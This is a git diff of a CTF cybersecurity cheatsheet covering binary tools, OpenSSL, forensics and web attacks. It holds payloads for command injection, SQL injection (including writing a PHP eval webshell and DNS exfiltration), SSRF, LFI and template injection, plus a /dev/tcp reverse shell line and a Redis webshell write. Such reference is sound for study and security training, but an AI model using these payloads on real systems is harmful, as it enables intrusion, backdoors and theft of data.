@@ -1,10 +1,8 @@
-# Tool
+# Cybersecurity Cheatsheet
 This is a cheatsheet for different types of CTF challenges.
 
 
 ## Binary
-
-### Tool
 - Command
   | Cmd                     | Comment        |
   |:------------------------|:---------------|
@@ -17,9 +15,9 @@ This is a cheatsheet for different types of CTF challenges.
 - Inspection
   - PE Viewer
     - reshacker
-    - CFF Explorer (ExplorerSuit)
-    - PE Detective (ExplorerSuit)
-    - Signature Explorer (ExplorerSuit)
+    - CFF Explorer (ExplorerSuite)
+    - PE Detective (ExplorerSuite)
+    - Signature Explorer (ExplorerSuite)
     - PE-bear
     - PEview
     - 010 editor
@@ -44,6 +42,7 @@ This is a cheatsheet for different types of CTF challenges.
     | `y`                                                  | type declaration       |
     | `<C-f>`                                              | search                 |
     | `<R>` > reset pointer type > create  new struct type |                        |
+    - [IDA Skins](https://github.com/zyantific/IDASkins)
   - Ghidra
   - Windbg preview
   - x64dbg
@@ -79,21 +78,17 @@ This is a cheatsheet for different types of CTF challenges.
 ### Calling Convention
 - cdecl
 - stdcall (win32api)
-
   ```c
   __attribute__((stdcall)) void func(int a, int b, int c) {
     ...
   }
   ```
-
 - fastcall
-
   ```c
   __attribute__((fastcall)) void func(int a, int b, int c) {
     ...
   }
   ```
-
 - thiscall
   > put `this` in `ecx`
   > 
@@ -143,8 +138,6 @@ This is a cheatsheet for different types of CTF challenges.
 
 
 ## Crypto
-  
-### Tool
 - python
   - pyCryptodome
   - Crypto.Util.number
@@ -156,6 +149,97 @@ This is a cheatsheet for different types of CTF challenges.
   - [CoCalc](https://cocalc.com/)
   - `apt install sagemath`
 - hashcat
+- openssl
+  - Generate
+    > [Generate cert chain](https://blog.davy.tw/posts/use-openssl-to-sign-intermediate-ca/)  
+    > [SAN](https://medium.com/@antelle/how-to-generate-a-self-signed-ssl-certificate-for-an-ip-address-f0dd8dddf754)  
+    > /etc/ssl/openssl.cnf
+
+    ```bash
+    # Gen Key (Optional)
+    openssl genrsa -out ca.key 4096
+
+    # CA
+    openssl req -new -out ca.crt -sha256 -x509 -days 7300 \
+      -newkey rsa:4096 -nodes -keyout ca.key \
+      -subj "/C=TW/ST=Taiwan/L=Hsinchu/O=Organization/OU=Organization Unit/CN=Common Name"
+
+    openssl ca -selfsign -keyfile ca.key -infiles ca.csr \
+      -startdate 20211001000000Z -enddate 20311001000000Z
+
+    # Intermediate CSR
+    openssl req -new -out intermediate.csr -sha256 \
+      -newkey rsa:4096 -nodes -keyout intermediate.key \
+      -config <(cat <<EOF
+    [ req ]
+    ...
+    EOF
+    )
+
+    # Intermediate / Endentity CRT
+    openssl x509 -req -out intermediate.crt -in intermediate.csr -days 7300 \
+      -CA ca.crt -CAkey ca.key -CAserial ca.serial -CAcreateserial \
+      -extensions x509v3_config -extfile <(cat <<EOF
+    [ x509v3_config ]
+    subjectKeyIdentifier = hash
+    authorityKeyIdentifier = keyid:always,issuer
+    basicConstraints = CA:true, pathlen:0
+    EOF
+    )
+    ```
+    
+  - Listen
+    ```bash
+    openssl genrsa -out server.key 4096
+    openssl req -new -key server.key -x509 -days 3653 -out server.crt
+    openssl s_server -key server.key -cert server.crt -port 443
+    ```
+  - Get cert from server
+    ```bash
+    openssl s_client -connect <ip>:<port> -showcerts
+    ```
+  - Read cert
+    ```bash
+    openssl x509 -in product.crt -noout -text
+    ```
+  - Verify cert 
+    ```bash
+    openssl verify -CAfile root.crt -untrusted intermediate.crt product.crt
+    openssl verify -CAfile <(cat intermediate.crt root.crt) product.crt
+    ```
+  - Verify cert with key
+    ```bash
+    printf '123' \
+      | openssl rsautl -encrypt -inkey <(openssl x509 -pubkey -noout -in sensor.crt) -pubin \
+      | openssl rsautl -decrypt -inkey sensor.key
+    ```
+  - Verify mutual-auth
+    ```
+    openssl s_server -debug \
+      -CAfile root.crt \
+      -cert_chain <(cat product.crt intermediate.crt root.crt) \
+      -cert server.crt \
+      -key server.key \
+      -Verify 5 -verify_return_error -port 12345
+    openssl s_client \
+      -CAfile root.crt \
+      -cert_chain <(cat product.crt intermediate.crt root.crt) \
+      -cert client.crt \
+      -key client.key \
+      -showcerts -connect 127.0.0.1:12345
+    curl \
+      --cacert root.crt \
+      --cert <(cat client.crt product.crt intermediate.crt) \
+      --key ./cert/client.key \
+      https://127.0.0.1:12345
+    ```
+- MakeCert and New-SelfSignedcertificate
+  ```
+  # MakeCert -n 'CN=code.signing' -ss My -r -pe -sr localmachine -cy end -eku 1.3.6.1.5.5.7.3.3 -len 4096 -b 2020/01/01 -e 2025/01/01
+  New-SelfSignedCertificate -CertStoreLocation 'Cert:\CurrentUser\My' -KeyAlgorithm RSA -KeyLength 4096 -Type CodeSigningCert -KeyUsage DigitalSignature -KeyUsageProperty Sign -Subject 'CN=code signing test'
+  Set-AuthenticodeSignature -FilePath @(Get-ChildItem -Recurse '*.exe','*.dll','*.ps1') -Certificate (Get-ChildItem Cert:\CurrentUser\My -codesigning)[0] -IncludeChain 'NotRoot' -HashAlgorithm SHA256 -TimestampServer 'http://timestamp.globalsign.com/?signature=sha2'
+  signtool.exe verify /pa <binary>
+  ```
 
 ### Cryptanalysis
 - Kerckhoff's Principle
@@ -179,13 +263,11 @@ This is a cheatsheet for different types of CTF challenges.
   > security dependes entirely on key stream (sync, async), which is random and reproducible
   
   - vulnerable to reused key attack
-    
     ```
     E(A) = A xor C
     E(B) = B xor C
     E(A) xor E(B) = A xor B
     ```
-
   - key stream generator
     > the key stream generator works like a Pseudorandom Number Generator (RNG),
     > which generate sequences from initial seed (key) value
@@ -230,85 +312,145 @@ This is a cheatsheet for different types of CTF challenges.
 
 ## Misc
 
-### Tool
-- File 
-  - binwalk 
-  - polyfile
-    - `polyfile <file>.pdf --html <file>.html`
-- Stego
-  - zsteg
-  - stegsolve.jar
-- Recover
-  - unt-wister
-
 ### QRcode
 - Content
 - Encode
 
-### PDF
-- decode
-  - `qpdf --qdf --object-streams=disable <infile> <outfile>`
+### Threat Intelligence
+- [SOCPrime](https://socprime.com/)
+- [AlienVault](https://otx.alienvault.com/)
+- [Anomali](https://www.anomali.com/)
+- [MITRE ATT&CK](https://attack.mitre.org/)
+- [CISA](https://www.cisa.gov/)
+- [BleepingComputer](https://www.bleepingcomputer.com/)
+- [The Hacker News](https://thehackernews.com/)
 
 
 ## System
+> [HackTricks](https://book.hacktricks.xyz/)
+> - logstash
 
-### Tool
 - Vulnerability Assessment
   - OpenVAS
   - metasploit
   - nmap
-- Forensic
+  - cobaltstrike
+- System Forensic
   - wireshark
   - autopsy
   - sleuthkit
   - OSForensic
   - regsnap
-  - SysinternalsSuit
-  - Task Exploere (ExplorerSuit)
-  - Driver List (ExplorerSuit)
-- Connection
-  - telnet
-  - nc / ncat
-  - socat
-  - openssl
+  - Process Monitor (SysinternalsSuite)
+  - Porcess Explorer (SysinternalsSuite)
+  - WinObj (SysinternalsSuite)
+  - Task Explorer (ExplorerSuite)
+  - Driver List (ExplorerSuite)
+- Binary Forensic
+  - binwalk 
+  - polyfile
+    - `polyfile <file>.pdf --html <file>.html`
+  - [file signature](https://filesignatures.net/)
+    > `47 49 46 38` GIF8
+    >
+    > `89 50 4e 47` .PNG
+  - `qpdf --qdf --object-streams=disable <infile> <outfile>`
+  - [Stego](https://0xrick.github.io/lists/stego/)
+    - zsteg
+    - stegsolve.jar
+  - Recover
+    - unt-wister
+- Malware Scanner
+  - [Microsoft Safety Scanner](https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/safety-scanner-download)
+  - [Trend Micro Anti-Threat Toolkit](https://www.trendmicro.com/zh_tw/business/capabilities/solutions-for/ransomware/free-tools.html)
+  - [VirusTotal](https://www.virustotal.com/gui/)
+  - [nodistribute](https://nodistribute.com/)
 
 ### Windows
 - `SET __COMPAT_LAYER=RunAsInvoker`
+- File
+  - `fsutil file queryfileid <file>`
+  - $(Get-Item filename).lastwritetime=$(Get-Date "mm/dd/yyyy hh:mm am/pm")
+- [Naming Files, Paths, and Namespaces](https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file)
+  - Namespace
+    - Win32 File Namespace
+      - `\\?\`
+        > tells the Windows APIs to disable all string parsing and to send the string that follows it straight to the file system
+      - `\\?\GLOBALROOT\Device\ConDrv\Console`
+        > `\\?\GLOBALROOT` ensures that the path following it looks in the true root path of the system object manager and not a session-dependent path
+    - Win32 Device Namespace
+      - `\\.\`
+        > access the Win32 device namespace instead of the Win32 file namespace
+    - NT Namespace
+      - `\??\` 
+        > NT Object Manager paths that can look up DOS-style devices like drive letters
+        > 1. process's `DosDevices` table
+        > 2. `\GLOBAL??` Object Manager directory
+        >
+        > A "fake" prefix which refers to per-user Dos devices
+        >
+        > ![file path handling, user / kernal mode](https://i.stack.imgur.com/LOeeO.png)
+      - | Path         | Content             |
+        |:-------------|:--------------------|
+        | `\Global??\` | Win32 namespace     |
+        | `\Device\`   | Named device object |
+  - Reserved Name (`\Global??\`)
+    | Filename | Meaning |
+    |:----|:---------------------------|
+    | CON | console (input and output) |
+    | AUX | an auxiliary device. In CP/M 1 and 2, PIP used PUN: (paper tape punch) and RDR: (paper tape reader) instead of AUX: |
+    | LST | list output device, usually the printer |
+    | PRN | as LST:, but lines were numbered, tabs expanded and form feeds added every 60 lines |
+    | NUL | null device, akin to /dev/null |
+    | EOF | input device that produced end-of-file characters, ASCII 0x1A |
+    | INP | custom input device, by default the same as EOF: |
+    | OUT | custom output device, by default the same as NUL: |
+- wmi
+  - `wbemtest.exe`
+- Windows Event
+  - Sysmon
+    - [SysmonSimulator](https://rootdse.org/posts/understanding-sysmon-events/)
+
+### MacOS
+- Resource Fork
+  - `namedfork`
 
 
-## Web
-- [WEB CTF CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet/blob/master/README.md#%E7%A9%BA%E7%99%BD%E7%B9%9E%E9%81%8E)
-- [Web Security CheatSheet](https://blog.p6.is/Web-Security-CheatSheet/)
-- [Basic Concept of Penetration Testing](https://hackmd.io/@boik/ryf5wZM5Q#/)
-- [Awesome Web Security](https://github.com/qazbnm456/awesome-web-security)
-- [Basic concept of Penetration Testing](https://hackmd.io/@boik/ryf5wZM5Q?type=slide#/)
+## Web / Remote
+> [WEB CTF CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet/blob/master/README.md#%E7%A9%BA%E7%99%BD%E7%B9%9E%E9%81%8E)  
+> [Web Security CheatSheet](https://blog.p6.is/Web-Security-CheatSheet/)  
+> [Basic Concept of Penetration Testing](https://hackmd.io/@boik/ryf5wZM5Q#/)  
+> [Awesome Web Security](https://github.com/qazbnm456/awesome-web-security)  
+> [Basic concept of Penetration Testing](https://hackmd.io/@boik/ryf5wZM5Q?type=slide#/)  
+> [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/index.html)  
 
-### Tool
 - Temp Server
   - webhook.site
     - unique URL (https / CORS)
     - unique email
   - hookbin.com
   - requestbin.net
-- HTTP Request
+- Connection
+  - `/dev/tcp/<HOST>/<PORT>`
+  - telnet
+  - nc / ncat
+  - socat
+- HTTP / HTTPS Request
   - [HTTPie](https://devhints.io/httpie)
-    
-    ```
-    http [--form] POST <url> \
-      <header>:<value> \
-      <query>==<value> \
-      <param>=<string> \
-      <param>:=<non-string> \
-      <param>:=<json> \
-      <file>@<filename>.bin \
-      <content>=@<filename>.txt \
-      <json>:=@<filename>.json
-    ```
 - Recon
-  - https://crt.sh/
-    > Enter an Identity (Domain Name, Organization Name, etc)
-  - maltego
-  - Burpsuit
+  - Target
+    - [SHODAN](https://www.shodan.io/)
+      > Search Engine for the Internet of Everything
+    - [Censys](https://search.censys.io/)
+      > Censys helps organizations, individuals, and researchers find and monitor
+      > every server on the Internet to reduce exposure and improve security
+  - Site Information
+    - maltego
+    - [Netcraft Site Report](https://sitereport.netcraft.com/)
+    - [crt.sh](https://crt.sh/)
+      > Enter an Identity (Domain Name, Organization Name, etc)
+    - [IANA WHOIS Service](https://www.iana.org/whois)
+    - [DomainTools](https://whois.domaintools.com/)
   - DNS
     - drill
     - dig
@@ -316,6 +458,9 @@ This is a cheatsheet for different types of CTF challenges.
     - host
     - dnsenum
     - knockpy.py
+    - [dnsdumpster](https://dnsdumpster.com/)
+    - [robtex](https://www.robtex.com/)
+      - Subdomains
   - Content
     - dirb
     - DirBuster
@@ -324,14 +469,26 @@ This is a cheatsheet for different types of CTF challenges.
   - sqlmap
   - xsser
   - ZAP
+- Payload
+  - Burpsuit
+  - Google Hacking
+    - [Google Hacking Database](https://www.exploit-db.com/google-hacking-database)
+  - [Exploit DB](https://www.exploit-db.com/)
+  - hydra
+    - crunch
+  - c-jwt-cracker
 - Backdoor
   - weevely
   - veil
   - BeEF
-- Cracker
-  - hydra
-    - crunch
-  - c-jwt-cracker
+
+### Background
+- [Basics of HTTP](https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Basics_of_HTTP)
+  - MIME
+    > type/subtype;parameter=value
+- [URI schemes](https://en.wikipedia.org/wiki/List_of_URI_schemes)
+  - Data URI
+    > data:[\<mediatype\>][;base64],\<data\>
 
 ### Broken Access Control
 - Insecure Direct Object References (IDOR)
@@ -340,25 +497,63 @@ This is a cheatsheet for different types of CTF challenges.
 
 ### Command Injection
 - Basic
-  - ping 127.0.0.1 `; id`
-  - ping 127.0.0.1 `| id`
-  - ping 127.0.0.1 `&& id`
-  - ping '127.0.0.1`'; id #` ' 
-  - ping "`$(id)`"
-  - cat mewo.txt `$(id)`
-  - cat mewo.txt `id`
+  - $ ping 127.0.0.1 `; id`
+  - $ ping 127.0.0.1 `| id`
+  - $ ping 127.0.0.1 `&& id`
+  - $ ping '127.0.0.1`'; id #` ' 
+  - $ ping "`$(id)`"
+  - $ cat mewo.txt `$(id)`
+  - $ cat mewo.txt `` `id` ``
+  - Newline (0x0A, \n, %0A)
 - Space Bypass
-  - cat\</flag
-  - {cat,/flag}
-  - cat$IFS/flag
-  - X=$'cat\x20/flag'&&$X
+  - $ cat`<TAB>`/flag
+  - $ cat\</flag
+  - $ {cat,/flag}
+  - $ cat$IFS/flag
+  - $ X=$'cat\x20/flag'&&$X
 - Keyword Bypass
-  - cat /f'la'g
-  - cat /f"la"g
-  - cat /f\l\ag
-  - cat /f\*
-  - cat /f?a?
-  - cat ${HOME:0:1}etc${HOME:0:1}passwd
+  - $ cat /f'la'g
+  - $ cat /f"la"g
+  - $ cat /f\l\ag
+  - $ cat /f\*
+  - $ cat /f?a?
+  - $ cat ${HOME:0:1}etc${HOME:0:1}passwd
+- Reverse Shell
+  - `/bin/sh -i >& /dev/tcp/<HOST>/<PORT> 0<&1`
+
+### CRLF Injection
+- Inject `\r\n` to headers
+  ```txt
+  request("http://host/ HTTP/1.1\r\nHeader: xxx\r\nX:")
+  -----------------------------------------------------
+  GET / HTTP/1.1\r\n
+  Header: xxx
+  X:` HTTP/1.1\r\n
+  Host: host\r\n
+  ...
+  ```
+
+  ```txt
+  ?redirect=http://example.com/%0d%0a%0d%0a...
+  --------------------------------------------
+  HTTP/1.1 302 Found
+  Content-Length: 35\r\n
+  Content-Type: text/html; charset=UTF-8\r\n
+  ...
+  Location: https://example.com\r\n
+  \r\n
+  <script>alert(1)</script>
+  ...
+  Server: Apache/2.4.41\r\n
+  \r\n
+  Redirecting to <a href="/">/</a> ...
+  ```
+- Redis
+  ```
+  http://127.0.0.1:6379/%0D%0ASET%20key%20"value"%0D%0A
+  -----------------------------------------------------
+  SET key "value"\r\n
+  ```
 
 ### CSRF
 - Cookies Security
@@ -428,6 +623,12 @@ This is a cheatsheet for different types of CTF challenges.
     - ...
   - [ysoserial](https://github.com/frohoff/ysoserial)
 - PHP
+  > Feature removed since PHP 8.0
+  - Phar Format
+    - stub
+    - manifest (... serialized file meta-data, stored in serialize() format ...)
+    - contents
+    - signature (optional)
   - Magic Method
     - \_\_destruct()
     - \_\_wakeup()
@@ -466,6 +667,7 @@ This is a cheatsheet for different types of CTF challenges.
 
     serialized = pickle.dumps(Exploit())
     pickle.loads(serialized)
+    # pickletools.dis(serialized)
     ```
 
 ### DOM Clobbering
@@ -480,7 +682,7 @@ This is a cheatsheet for different types of CTF challenges.
 
 ### HTTP Desync Attacks
 
-### Local File Inclusion
+### Local File Inclusion (LFI)
 - RCE
   - access.log / error.log
   - /proc/self/environ `user-agent`
@@ -509,11 +711,18 @@ This is a cheatsheet for different types of CTF challenges.
                  ...
                  resource=phpinfo.php
     ```
+
   - `php://input`
   - `php://fd`
 - Sensitive Files
+  - Source Code
   - Version Contorl
-    - [git-dumper](https://github.com/arthaud/git-dumper)  
+    - [.git](https://github.com/arthaud/git-dumper)
+    - .svn
+    - .bzr
+  - Hidden File
+    - [.DS\_Store](https://github.com/lijiejie/ds_store_exp)
+    - .index.php.swp
   - Unix
     - /etc/hosts
     - /etc/passwd
@@ -528,13 +737,13 @@ This is a cheatsheet for different types of CTF challenges.
     - /proc/self/environ
     - /proc/self/exe
     - /proc/self/fd/[num]
-  - Web Server
+  - Web Server Config Files
     - /etc/apache2/apache2.conf
     - /etc/apache2/sites-available/000-default.conf
     - /etc/nginx/nginx.conf
     - /etc/php/php.ini
 - Path Bypass
-  - encoding
+  - Encoding
     | Encoding                        | Payload   | Decode |
     |:--------------------------------|:----------|:-------|
     | unicode/UTF-8 encoding          | %c1%1c    |        |
@@ -557,18 +766,44 @@ This is a cheatsheet for different types of CTF challenges.
     | 16-bit Unicode encoding         | %u002e    | `.`    |
     |                                 | %u2215    | `/`    |
     |                                 | %u2216    | `\`    |
-  - Null bytes
+  - Null Bytes
     > bypass file type checking
 
     - `../../../../../passwd%00.jpg`
-  - Mangled paths
+  - Mangled Paths
     > bypass removing traversal sequences
 
     - `....//`
     - `...\//`
     - `..//..//..\`        
+  - Nginx Misconfiguration
+    > Nginx off-by-slash fail
+    >
+    > `http://127.0.0.1/static../settings.py` => `/home/app/static/../settings.py`
+    
+    ```
+    location /static {
+      alias /home/app/static/;
+    }
+    ```
+
+- Extension Bypass
+  - pHP
+  - pht, phtml, php[3,4,5,7]
+  - html, svg
+  - Apache2 Feature
+    > xxx.abc => run as php file
+
+    ```
+    .htaccess
+    ---------
+    <FilesMatch "abc">
+      SetHandler application/x-httpd-php
+    </FilesMatch>
+    ```
+
         
-### Pr  ototype Pollution
+### Prototype Pollution
 - `a`.  \_\_proto\_\_ === `A`.prototype
 - `und  efined` may be replaced when its prototype has the attribute.
 - Trig  ger
@@ -595,18 +830,25 @@ This is a cheatsheet for different types of CTF challenges.
 
 ### SQL Injection
 - Type
+  > Prevent: Parameterized Query, Prepared Statement
+
   - Union Based
   - Blind
     - Boolean Based
       ```
       ... id = 1 and length(user()) > 0
       ... id = 1 and length(user()) > 16
+      ... id = 1 and ascii(mid(user(),1,1)) > 0
+      ... id = 1 and ascii(mid(user(),1,1)) > 80
       ```
     - Time Based
-      ```
-      ... id = 1 and IF(ascii(mid(user(),1,1))>0, SLEEP(10), 1)
-      ... id = 1 and IF(ascii(mid(user(),1,1))>80, SLEEP(10), 1)
-      ```
+      - sleep
+        ```
+        ... id = 1 and IF(ascii(mid(user(),1,1))>0, SLEEP(10), 1)
+        ... id = 1 and IF(ascii(mid(user(),1,1))>80, SLEEP(10), 1)
+        ```
+      - query / large calculation data
+      - repeat('A', 10000)
   - Error
     - ExtractValue(xml, xpath)
       ```
@@ -623,7 +865,13 @@ This is a cheatsheet for different types of CTF challenges.
     | DB              | Payload                                                                 | Comment   |
     |:----------------|:------------------------------------------------------------------------|:----------|
     | MySQL + Windows | `load_file(concat("\\\\", password, ".splitline.tw"))`                  | DNS Query |
+    |                 | SMB + DNS query log ([DNSBin](https://github.com/ettic-team/dnsbin))    |           |
     | Oracle          | `url_http.request('http://splitline.tw/' \|\| (SELECT user FROM dual))` |           |
+  - Multi Byte SQL Injection
+- Read / Write File
+  - `SELECT LOAD_FILE('/etc/passwd')` (MySQL)
+  - `SELECT pg_read_file('/etc/passwd', <offset>, <length>)` (PostgresSQL)
+  - `SELECT "<?php eval($_GET[x]);?>" INTO OUTFILE "/var/www/html/shell.php"` (MySQL)
 - Common Function
   | DB     | Function          |                 |           |            |          |
   |:-------|:------------------|:----------------|:----------|:-----------|:---------|
@@ -631,15 +879,18 @@ This is a cheatsheet for different types of CTF challenges.
   |        | group\_concat()   |                 |           |            |          |
   | Oracle | url\_http.request |                 |           |            |          |
 - Special Table
-  | DB          | Payload                                               | Comment   |
-  |:------------|:------------------------------------------------------|:----------|
-  | MySQL > 5.0 | `SELECT schema_name FROM information_schema.schemata` | Databases |
-  |             | `SELECT table_name FROM information_schema.tables`    | Tables    |
-  |             | `SELECT column_name FROM information_schema.columns`  | Columns   |
+  | DB           | Payload                                                             | Comment   |
+  |:-------------|:--------------------------------------------------------------------|:----------|
+  | MySQL >= 5.0 | `SELECT schema_name FROM information_schema.schemata`               | Databases |
+  |              | `SELECT table_name FROM information_schema.tables`                  | Tables    |
+  |              | `SELECT group_concat(column_name) FROM information_schema.columns`  | Columns   |
 
 ### SSRF
+> [SSRF bible Cheatsheet](https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf)
+
 - Scheme
-  - [URL schema support](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#bookmark=id.osggnj3pn7l6)
+  > [URL schema support](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#bookmark=id.osggnj3pn7l6)
+
   - HTTP
     - Docker API  
       `http://IP:2375/images/json`
@@ -648,6 +899,8 @@ This is a cheatsheet for different types of CTF challenges.
     - Cloud Metadata (AWS)  
       `http://169.254.169.254/latest/user-data/...`
   - Gopher
+    > Generate arbitrary TCP packet under no interaction.
+    >
     > `gopher://<authority>/<padding><tcp payload>`
 
     - [Gopher Payload Generator](https://github.com/tarunkant/Gopherus)
@@ -657,6 +910,7 @@ This is a cheatsheet for different types of CTF challenges.
       [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)
     - Redis  
       `gopher://127.0.0.1:6379/_SET%20key%20"value"%0D%0A`
+    - PHP-FPM
   - Local File
     - `file:///etc/passwd`
     - `file://localhost/etc/passwd`
@@ -664,33 +918,33 @@ This is a cheatsheet for different types of CTF challenges.
     - `java` `file:///var/www/html/`
     - `java` `netdoc:///var/www/html/`
 - Authority
-  - Representation
+  - localhost
     - 127.0.0.1
     - localhost
     - 127.0.1
     - 127.1
     - 0.0.0.0
     - 0
+  - IP Address
+    - 2130706443 (dec)
+    - 0x7f00000001 (hex)
+    - 0x7f.0x0.0x0.0x1
+    - 0177000000001 (oct)
+    - 0177.0.0.01
   - IPv6
     - ::1
     - ::127.0.0.1
     - ::ffff:127.0.0.1
     - ::
     - ip6-localhost
-  - Positional Notation
-    - 2130706443 (dec)
-    - 0x7f00000001 (hex)
-    - 0x7f.0x0.0x0.0x1
-    - 0177000000001 (oct)
-    - 0177.0.0.01
   - IDN Encoding
     - http://www.unicode.org/reports/tr46/  
-    - https://splitline.github.io/domain-obfuscator/
+    - [Domain Obfuscator](https://splitline.github.io/domain-obfuscator/)
     - http://ⓀⒶⒾⒷⓇⓄ.ⓉⓌ
   - Domain Name Binding
     - whatever.localtest.me
     - 127.0.0.1.xip.io
-  - DNS Rebinding
+  - DNS Rebinding (Round-Robin DNS)
     - foo.bar.10.0.0.1.xip.io
     - A.54.87.54.87.1time.127.0.0.1.forever.rebind.network
     - 36573657.7f000001.rbndr.us
@@ -699,7 +953,7 @@ This is a cheatsheet for different types of CTF challenges.
     >
     > ```php
     > <?php
-    >   Header("Locathon: gohper://127.0.0.1:9000/_...")
+    >   Header("Locathon: gopher://127.0.0.1:9000/_...")
     > ?>
     > ```
   - URL Parser
@@ -718,7 +972,7 @@ This is a cheatsheet for different types of CTF challenges.
 - Jinja2
   > Flask default template engine
 
-  - {{ config }}
+  - `{{ config }}`
     - config.SECRET\_KEY
     - config.from\_pyfile(filename)
   - sandbox bypass
@@ -768,13 +1022,13 @@ This is a cheatsheet for different types of CTF challenges.
 
   - Bypass
     - Use url parameter
-      * url/?content=xxx&param1=yyy&param2=zzz
-
-        ```
-        xxx = ""[request.args.param1][request.args.param2]
-        yyy = __class__
-        zzz = __base__
-        ```
+      ```
+      url/?content=xxx&param1=yyy&param2=zzz
+      --------------------------------------
+      xxx = ""[request.args.param1][request.args.param2]
+      yyy = __class__
+      zzz = __base__
+      ```
 
 - Format String Attack
 
@@ -803,7 +1057,38 @@ This is a cheatsheet for different types of CTF challenges.
 ### XXE (XML External Entity Injection)
 
 
-## Language
+## Language & Framework
+
+### Shell
+- [Shell Parameter Expansion](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html#Shell-Parameter-Expansion)
+  | Parameter Expansion   | x="a1 b1 c2 d2" |
+  |:----------------------|:----------------|
+  | `${x#*1}`             | &nbsp; b1 c2 d2 |
+  | `${x##*1}`            | &nbsp; c2 d2    |
+  | `${x%1*}`             | a1 b            |
+  | `${x%%1*}`            | a               |
+  | `${x/1/3}`            | a3 b1 c2 d2     |
+  | `${x//1/3}`           | a3 b3 c2 d2     |
+  | `${x//?1/z3}`         | z3 z3 c2 d2     |
+  | `${x:0:2}`            | a1              |
+- Command
+  - printf
+    ```bash
+    printf '%s.' a b c
+    ------------------
+    a.b.c.
+    ```
+
+### Redis
+- Write file
+  ```
+  FLUSHALL
+  SET payload "<?php phpinfo() ?>"
+  CONFIG SET DIR /var/www/html/
+  CONFIG SET DBFILENAME shell.php
+  SAVE
+  ```
+- [RCE](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)
 
 ### JavaScript
 - Reference
@@ -836,6 +1121,26 @@ This is a cheatsheet for different types of CTF challenges.
     - `$func="system"; $func("ls -al");`
   - system(id) -> system("id")
   - echo \`id\` -> system("id")
+- [Tags](https://www.php.net/manual/en/language.basic-syntax.phptags.php)
+  - normal tag
+
+    ```
+    <?php echo 'test' ?>
+    ```
+
+  - short tag
+    > can be disabled via the `short_open_tag` in `php.ini`, or are disabled
+    > by default if PHP is built with the `--disable-short-tags` configuration
+
+    ```php
+    <? echo 'test' ?>
+    ```
+
+  - short echo tag
+
+    ```php
+    <?= 'test' ?>
+    ```
 
 ### Python
 - Reference
